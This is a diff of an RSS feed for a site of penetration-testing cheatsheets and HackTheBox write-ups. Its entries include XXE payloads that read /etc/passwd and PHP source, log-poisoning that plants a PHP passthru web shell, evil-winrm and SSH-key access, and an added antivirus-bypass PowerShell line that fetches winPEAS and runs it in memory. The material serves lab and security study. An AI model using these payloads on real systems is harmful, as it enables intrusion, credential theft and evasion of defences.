@@ -62,14 +62,14 @@
       <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/network/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/network/</guid>
-      <description>nmap # enumerate services and use default scripts&#xA;nmap -sC -sV -oN normal.txt target-ip scan all tcp ports&#xA;nmap -p- -oN all_ports.txt target-ip scan all udp ports&#xA;nmap -p- -sU -oN all_udp_ports.txt target-ip use script categories&#xA;nmap --script vuln,safe,discovery -oN scan.txt target-ip list all nse scripts&#xA;ls -lh /usr/share/nmap/scripts/ nmap through socks4 proxy&#xA;nmap --proxies socks4://proxy-ip:1080 target-ip ftp bounce scan&#xA;nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv massscan # todo</description>
+      <description>nmap # enumerate services and use default scripts&#xA;nmap -sC -sV -oN normal.txt target-ip scan all tcp ports&#xA;nmap -p- -oN all_ports.txt target-ip scan all udp ports&#xA;nmap -p- -sU -oN all_udp_ports.txt target-ip use script categories&#xA;nmap --script vuln,safe,discovery -oN scan.txt target-ip list all nse scripts&#xA;ls -lh /usr/share/nmap/scripts/ host discovery for fast scan&#xA;nmap -sn -v -oA nmap/host_discovery target-ip find all host that are up&#xA;grep &amp;#34;Up&amp;#34; nmap/host_discovery.gnmap | awk &amp;#39;{print $2}&amp;#39; &amp;gt; ips_host_discovery.</description>
     </item>
     <item>
       <title>network</title>
       <link>https://www.tagnull.de/docs/Cheatsheet/initial-access/network/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://www.tagnull.de/docs/Cheatsheet/initial-access/network/</guid>
-      <description> ftp # login via ftp&#xA;ftp target-ip anonymous login&#xA;username: anonymous password: anonymous XML External Entity (XXE) # Read local files&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; Read binary or files that otherwise can&amp;rsquo;t be display (.php)&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=db.php&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; </description>
+      <description> ftp # login via ftp&#xA;ftp target-ip anonymous login&#xA;username: anonymous password: anonymous </description>
     </item>
     <item>
       <title>network</title>
@@ -77,6 +77,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://www.tagnull.de/docs/Cheatsheet/lateral-movement/network/</guid>
       <description>evil-winrm # get shell via evil-winrm&#xA;./evil-winrm.rb -u username -p password -i target-ip ssh / tunneling # create ssh-key&#xA;ssh-keygen add public-key to authorized_keys&#xA;cat rsa.pub &amp;gt;&amp;gt; authorized_keys set permission on private-key&#xA;chmod 600 id_rsa login via ssh-key&#xA;ssh -i id_rsa username@target-ip login with older ciphers&#xA;ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc username@target-ip start tool after ssh login&#xA;ssh username@target-ip -o &amp;#34;ProxyCommand=ncat --proxy-type http --proxy target-ip:proxy-port 127.0.0.1 22&amp;#34; ssh port forwarding</description>
+    </item>
+    <item>
+      <title>reflective code loading</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/av-bypass/reflective-code-loading/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/av-bypass/reflective-code-loading/</guid>
+      <description> powershell # $url = &amp;#34;https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe&amp;#34; $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest &amp;#34;$url&amp;#34; -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(&amp;#34;log&amp;#34;) </description>
     </item>
     <item>
       <title>sql</title>
@@ -90,7 +97,7 @@
       <link>https://www.tagnull.de/docs/Cheatsheet/initial-access/web/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://www.tagnull.de/docs/Cheatsheet/initial-access/web/</guid>
-      <description> XML External Entity (XXE) # Read local files&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; Read binary or files that otherwise can&amp;rsquo;t be display (.php)&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=db.php&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; LFI via nc # logfile injection&#xA;nc target-ip target-port GET /&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt; HTTP/1.1 Host: &amp;lt;IP&amp;gt; Connection: close Afterwards include the it via lfi&#xA;?lfi_file=/var/log/apache2/access.log&amp;amp;cmd=&amp;lt;command&amp;gt; </description>
+      <description>XML External Entity (XXE) # Read local files&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; Read binary or files that otherwise can&amp;rsquo;t be display (.php)&#xA;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE replace [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=db.php&amp;#34;&amp;gt;]&amp;gt; &amp;lt;foo&amp;gt; &amp;lt;something&amp;gt;&amp;amp;xxe;&amp;lt;/something&amp;gt; &amp;lt;/foo&amp;gt; LFI via nc # logfile injection&#xA;nc target-ip target-port GET /&amp;lt;?php passthru($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt; HTTP/1.1 Host: &amp;lt;IP&amp;gt; Connection: close Afterwards include the it via lfi&#xA;?lfi_file=/var/log/apache2/access.log&amp;amp;cmd=&amp;lt;command&amp;gt; XML External Entity (XXE) # Read local files</description>
     </item>
     <item>
       <title>web</title>
@@ -223,7 +230,7 @@
       <link>https://www.tagnull.de/docs/HTB-Writeups/ypuffy/</link>
       <pubDate>Sat, 09 Feb 2019 00:00:00 +0000</pubDate>
       <guid>https://www.tagnull.de/docs/HTB-Writeups/ypuffy/</guid>
-      <description>External Recon # Let&amp;rsquo;s start with nmap. But let&amp;rsquo;s spice it up a bit with an additional script:&#xA;nmap -sC -sV -oN initial --script discovery 10.10.10.107&#xA;The output is quite big. You can the output here.&#xA;The script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:&#xA;Open Ports 22, 80, 139, 389, 445 [Top]</description>
+      <description>External Recon # Let&amp;rsquo;s start with nmap. But let&amp;rsquo;s spice it up a bit with an additional script:&#xA;nmap -sC -sV -oN initial --script discovery 10.10.10.107&#xA;The output is quite big. You can the output here.&#xA;The script tries to get as much information as possible of your target and in this case shows some LDAP information and the following open ports:&#xA;Open Ports 22, 80, 139, 389, 445 Explore # The sambaNTPassword Hash immediately caught my attention.</description>
     </item>
     <item>
       <title>SecNotes - WriteUp</title>
